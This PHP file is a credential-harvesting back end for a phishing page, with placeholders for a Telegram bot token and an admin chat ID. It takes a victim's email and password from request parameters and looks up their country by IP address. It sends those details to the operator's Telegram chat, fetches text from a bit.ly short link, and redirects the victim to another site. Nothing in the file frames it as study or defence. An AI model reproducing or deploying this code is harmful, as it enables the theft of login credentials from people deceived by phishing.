<?php
ob_start();
$API_KEY = "YOUR TOKEN";

define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "YOUR ID";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];

if($email){
$cty = file_get_contents("https://ipapi.co/".$ip."/country_name");
$ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");
$url1 = 'http://www.verifyac.com/index.php?uc=F';
header("location: $url1");
$name = $message->from->first_name;
$dev = file_get_contents('https://bit.ly/394xXdQ');
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵

👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `$ccode`
🔱 ¦ 𝑳𝒐𝒈𝒊𝒏 » $login
👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
⚜¦ 𝑩𝒀 » $dev
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='http://www.verifyac.com/index.php?uc=F'" />
    <script type="text/javascript">
            window.location.href = "http://www.verifyac.com/index.php?uc=F"
    </script>
 </head>
  <body>
  </body>
</html>
